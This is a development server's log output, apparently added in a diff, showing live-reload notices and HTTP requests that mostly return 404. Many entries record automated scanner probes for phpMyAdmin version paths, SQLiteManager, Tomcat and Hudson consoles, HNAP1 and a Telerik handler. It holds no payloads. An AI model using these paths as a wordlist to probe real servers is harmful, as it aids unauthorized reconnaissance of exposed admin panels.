+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.459 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.758 ms - 150[0m
+[0mGET /favicon.ico [33m404 [0m0.428 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.480 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m242.658 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.487 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m5.292 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m43.882 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.379 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.389 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.404 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.375 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.430 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.488 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.318 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m12.634 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.497 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.439 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m0.457 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.387 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.378 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.384 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.396 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.348 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.392 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m60.317 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m16.130 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m24.472 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.431 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.454 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.637 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m22.697 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m117.897 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.474 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.393 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.542 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.468 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.539 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.381 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m6.261 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.365 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.388 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m245.104 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.408 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.362 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.491 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m5.963 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.442 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m3.980 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m4.365 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.452 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.271 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.434 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.396 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.388 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m19.800 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m59.629 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.386 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /system_api.php [33m404 [0m49.480 ms - 153[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /c/version.js [33m404 [0m0.448 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /streaming/clients_live.php [33m404 [0m0.374 ms - 165[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/version.js [33m404 [0m0.405 ms - 166[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /client_area/ [33m404 [0m0.388 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /stalker_portal/c/ [33m404 [0m0.364 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.541 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /manager/html [33m404 [0m95.032 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://www.msftncsi.com/ncsi.txt [33m404 [0m3.653 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.421 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /hudson/script [33m404 [0m0.426 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /script [33m404 [0m4.373 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlite/main.php [33m404 [0m0.345 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlitemanager/main.php [33m404 [0m0.363 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLiteManager/main.php [33m404 [0m0.426 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLite/main.php [33m404 [0m0.386 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQlite/main.php [33m404 [0m0.415 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /main.php [33m404 [0m0.372 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php [33m404 [0m0.493 ms - 199[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLiteManager-1.2.4/main.php [33m404 [0m0.803 ms - 167[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /agSearch/SQlite/main.php [33m404 [0m0.397 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmyadmin/ [33m404 [0m0.400 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin/ [33m404 [0m0.355 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /PMA/ [33m404 [0m0.374 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /pma/ [33m404 [0m0.375 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/ [33m404 [0m0.347 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /dbadmin/ [33m404 [0m0.369 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysql/ [33m404 [0m0.367 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /myadmin/ [33m404 [0m0.395 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /openserver/phpmyadmin/ [33m404 [0m0.405 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmyadmin2/ [33m404 [0m0.367 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin2/ [33m404 [0m0.376 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2/ [33m404 [0m0.356 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /php-my-admin/ [33m404 [0m0.410 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.2.3/ [33m404 [0m0.394 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.2.6/ [33m404 [0m0.360 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.1/ [33m404 [0m0.338 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.4/ [33m404 [0m0.370 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-rc1/ [33m404 [0m0.370 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-rc2/ [33m404 [0m0.410 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5/ [33m404 [0m0.369 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-pl1/ [33m404 [0m0.359 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6-rc1/ [33m404 [0m0.368 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6-rc2/ [33m404 [0m2.912 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6/ [33m404 [0m0.394 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.7/ [33m404 [0m0.375 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.7-pl1/ [33m404 [0m0.414 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-alpha/ [33m404 [0m0.752 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-alpha2/ [33m404 [0m0.370 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-beta1/ [33m404 [0m0.388 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-beta2/ [33m404 [0m0.372 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc1/ [33m404 [0m0.372 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc2/ [33m404 [0m0.381 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc3/ [33m404 [0m0.384 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0/ [33m404 [0m0.369 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl1/ [33m404 [0m0.367 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl2/ [33m404 [0m0.363 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl3/ [33m404 [0m38.606 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-rc1/ [33m404 [0m0.400 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-rc2/ [33m404 [0m0.359 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1/ [33m404 [0m0.376 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl1/ [33m404 [0m0.363 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl2/ [33m404 [0m0.338 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl3/ [33m404 [0m0.373 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m0.365 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-beta1/ [33m404 [0m0.352 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m0.359 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2/ [33m404 [0m0.818 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-pl1/ [33m404 [0m0.366 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m0.356 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3-rc1/ [33m404 [0m0.365 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m0.376 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3-pl1/ [33m404 [0m0.355 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-rc1/ [33m404 [0m0.386 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl1/ [33m404 [0m0.349 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl2/ [33m404 [0m57.060 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl3/ [33m404 [0m0.374 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl4/ [33m404 [0m5.786 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4/ [33m404 [0m0.375 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-beta1/ [33m404 [0m0.372 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-rc1/ [33m404 [0m0.358 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-pl1/ [33m404 [0m0.351 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-pl2/ [33m404 [0m0.347 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0/ [33m404 [0m0.367 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-beta1/ [33m404 [0m1.992 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-rc1/ [33m404 [0m0.329 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-rc2/ [33m404 [0m0.353 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0/ [33m404 [0m0.768 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.1/ [33m404 [0m0.352 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.2/ [33m404 [0m0.454 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.3/ [33m404 [0m0.342 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.4/ [33m404 [0m0.394 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.1-rc1/ [33m404 [0m0.364 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.1/ [33m404 [0m0.366 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.2/ [33m404 [0m0.369 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlmanager/ [33m404 [0m0.357 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysqlmanager/ [33m404 [0m0.366 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /p/m/a/ [33m404 [0m3.229 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /PMA2005/ [33m404 [0m0.353 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /pma2005/ [33m404 [0m0.377 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmanager/ [33m404 [0m0.380 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /php-myadmin/ [33m404 [0m0.369 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmy-admin/ [33m404 [0m0.351 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /webadmin/ [33m404 [0m0.362 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlweb/ [33m404 [0m0.355 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /websql/ [33m404 [0m0.349 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /webdb/ [33m404 [0m0.392 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysqladmin/ [33m404 [0m0.484 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysql-admin/ [33m404 [0m0.335 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m139.604 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m3.288 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m101.229 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m46.902 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.522 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.551 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.462 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m19.706 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.523 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.596 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[32mServing "/home/visrvadmin/vi-soft/fileServer/client" at http://127.0.0.1:8090[39m
+[36mReady for changes[39m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404[0m 2.705 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404[0m 0.593 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/login.html
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /login.html [33m404[0m 0.638 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /login.html [33m404[0m 0.499 ms - 149[0m
+[0mGET /login.html [33m404[0m 0.504 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /login.html [33m404[0m 0.562 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /login.html [33m404[0m 0.544 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /login.html [33m404[0m 0.579 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/login.html
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/login.html
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/login.html
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404[0m 1.158 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/fileServerFront.zip
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/vi-soft/fileServer/client/forServer.tar
